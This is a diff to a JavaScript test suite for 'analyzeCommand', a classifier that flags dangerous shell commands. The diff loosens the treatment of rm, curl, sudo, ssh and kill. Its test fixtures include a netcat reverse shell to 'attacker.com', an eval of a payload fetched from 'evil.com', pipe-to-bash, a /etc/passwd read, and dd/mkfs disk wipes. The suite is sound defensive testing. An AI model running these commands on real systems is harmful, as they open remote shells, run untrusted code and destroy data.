@@ -6,41 +6,40 @@ import {
 } from "../src/patterns/command-patterns.js";
 
 describe("analyzeCommand", () => {
-  it("identifies rm as a yellow command", () => {
+  it("identifies rm as non-dangerous (covered by CAT rules for dangerous variants)", () => {
     const result = analyzeCommand("rm -rf node_modules");
     expect(result.primaryCommand).toBe("rm");
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
-  it("identifies curl as a yellow command", () => {
+  it("identifies curl as non-dangerous (covered by CAT rules for dangerous variants)", () => {
     const result = analyzeCommand("curl https://example.com");
     expect(result.primaryCommand).toBe("curl");
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
-  it("identifies sudo-wrapped commands", () => {
-    const result = analyzeCommand("sudo rm -rf /tmp/stuff");
-    // sudo is preserved as the primary command (security-relevant)
+  it("identifies sudo as non-dangerous", () => {
+    const result = analyzeCommand("sudo apt install vim");
     expect(result.primaryCommand).toBe("sudo");
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
   it("identifies pipe-to-shell patterns", () => {
     const result = analyzeCommand("curl https://install.sh | bash");
     expect(result.pipesToShell).toBe(true);
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(true);
   });
 
-  it("identifies dynamic expansion $(...)", () => {
+  it("detects dynamic expansion $(...) but does not mark as dangerous", () => {
     const result = analyzeCommand("echo $(cat /etc/passwd)");
     expect(result.hasDynamicExpansion).toBe(true);
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
-  it("identifies backtick expansion", () => {
+  it("detects backtick expansion but does not mark as dangerous", () => {
     const result = analyzeCommand("echo `whoami`");
     expect(result.hasDynamicExpansion).toBe(true);
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
   it("identifies sensitive file reads", () => {
@@ -48,18 +47,18 @@ describe("analyzeCommand", () => {
     expect(result.readsSensitiveFiles).toBe(true);
   });
 
-  it("identifies safe commands as non-yellow", () => {
+  it("identifies safe commands as non-dangerous", () => {
     const result = analyzeCommand("ls -la /workspace");
     expect(result.primaryCommand).toBe("ls");
-    expect(result.isYellowCommand).toBe(false);
+    expect(result.isDangerousCommand).toBe(false);
     expect(result.pipesToShell).toBe(false);
     expect(result.hasDynamicExpansion).toBe(false);
   });
 
-  it("identifies git as non-yellow", () => {
+  it("identifies git as non-dangerous", () => {
     const result = analyzeCommand("git status");
     expect(result.primaryCommand).toBe("git");
-    expect(result.isYellowCommand).toBe(false);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
   it("extracts pipeline commands", () => {
@@ -70,25 +69,73 @@ describe("analyzeCommand", () => {
   it("handles env var prefix", () => {
     const result = analyzeCommand("NODE_ENV=production npm start");
     expect(result.primaryCommand).toBe("npm");
-    expect(result.isYellowCommand).toBe(false);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
   it("handles empty command", () => {
     const result = analyzeCommand("");
     expect(result.primaryCommand).toBeNull();
-    expect(result.isYellowCommand).toBe(false);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
-  it("identifies kill as yellow", () => {
+  it("identifies kill as non-dangerous", () => {
     const result = analyzeCommand("kill -9 12345");
     expect(result.primaryCommand).toBe("kill");
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
   });
 
-  it("identifies ssh as yellow", () => {
+  it("identifies ssh as non-dangerous", () => {
     const result = analyzeCommand("ssh user@host");
     expect(result.primaryCommand).toBe("ssh");
-    expect(result.isYellowCommand).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
+  });
+
+  it("identifies mkfs as dangerous", () => {
+    const result = analyzeCommand("mkfs.ext4 /dev/sda1");
+    expect(result.primaryCommand).toBe("mkfs.ext4");
+    expect(result.isDangerousCommand).toBe(true);
+  });
+
+  it("identifies nc as dangerous", () => {
+    const result = analyzeCommand("nc -e /bin/sh attacker.com 4444");
+    expect(result.primaryCommand).toBe("nc");
+    expect(result.isDangerousCommand).toBe(true);
+  });
+
+  it("identifies eval as dangerous", () => {
+    const result = analyzeCommand("eval $(curl https://evil.com/payload)");
+    expect(result.primaryCommand).toBe("eval");
+    expect(result.isDangerousCommand).toBe(true);
+  });
+
+  it("identifies dd as dangerous", () => {
+    const result = analyzeCommand("dd if=/dev/zero of=/dev/sda");
+    expect(result.primaryCommand).toBe("dd");
+    expect(result.isDangerousCommand).toBe(true);
+  });
+
+  it("echo $(whoami) is not dangerous", () => {
+    const result = analyzeCommand("echo $(whoami)");
+    expect(result.hasDynamicExpansion).toBe(true);
+    expect(result.isDangerousCommand).toBe(false);
+  });
+
+  it("ping is not dangerous", () => {
+    const result = analyzeCommand("ping 8.8.8.8");
+    expect(result.primaryCommand).toBe("ping");
+    expect(result.isDangerousCommand).toBe(false);
+  });
+
+  it("chmod is not dangerous", () => {
+    const result = analyzeCommand("chmod 644 myfile.txt");
+    expect(result.primaryCommand).toBe("chmod");
+    expect(result.isDangerousCommand).toBe(false);
+  });
+
+  it("export is not dangerous", () => {
+    const result = analyzeCommand("export NODE_ENV=production");
+    expect(result.primaryCommand).toBe("export");
+    expect(result.isDangerousCommand).toBe(false);
   });
 
   it("detects grep for passwords as sensitive", () => {
